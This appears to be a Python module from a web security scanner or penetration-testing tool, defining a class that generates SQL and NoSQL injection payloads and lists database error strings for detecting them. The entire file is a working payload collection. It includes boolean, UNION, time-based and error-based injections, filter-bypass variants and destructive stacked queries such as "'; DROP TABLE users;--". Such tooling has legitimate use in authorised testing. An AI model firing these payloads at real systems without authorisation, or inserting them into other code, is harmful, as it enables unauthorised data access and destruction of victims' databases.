"""
SQL 注入攻击载荷。

职责：生成各类 SQL 注入载荷，包括联合查询、布尔盲注、
      时间盲注、报错注入等。
"""
from __future__ import annotations

from typing import Any, Dict, List, Optional

from .base import Payload


class SQLInjectionPayload(Payload):
    """
    SQL 注入攻击载荷。

    覆盖常见 SQL 注入类型：
    - 联合查询注入（UNION SELECT）
    - 布尔盲注（OR/AND 条件）
    - 时间盲注（SLEEP / WAITFOR）
    - 报错注入（EXTRACTVALUE / UPDATEXML）
    - 堆叠注入（DROP TABLE）
    """

    @property
    def name(self) -> str:
        return "sql_injection"

    @property
    def severity(self) -> str:
        return "critical"

    def generate(self, params: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        生成 SQL 注入载荷列表。

        Returns:
            SQL 注入载荷字符串列表。
        """
        payloads = [
            # 布尔盲注
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            '" OR "1"="1',
            "' OR ''='",
            "1' OR '1'='1",

            # 联合查询注入
            "1' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "1' UNION SELECT 1,2,3,4,5--",

            # 时间盲注
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",

            # 报错注入
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--",
            "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT version())), 1)--",

            # 堆叠注入
            "'; DROP TABLE users;--",
            "1; DROP TABLE users--",

            # 注释绕过
            "'/**/OR/**/1=1--",
            "'/*!50000OR*/1=1--",

            # 编码绕过
            "%27%20OR%201%3D1",
            "\\x27 OR 1=1--",

            # NoSQL 注入（MongoDB）
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": ".*"}',
        ]
        return payloads

    def get_detection_patterns(self) -> List[str]:
        """SQL 注入检测特征模式。"""
        return [
            "sql syntax",
            "mysql_fetch",
            "mysql_num_rows",
            "ORA-",
            "SQLite3::",
            "pg_query",
            "pg_fetch",
            "Microsoft OLE DB Provider",
            "ODBC SQL Server Driver",
            "Unclosed quotation mark",
            "SQLSTATE",
            "Syntax error",
            "Warning: mysql",
            "You have an error in your SQL syntax",
            "supplied argument is not a valid",
            "unterminated quoted string",
        ]
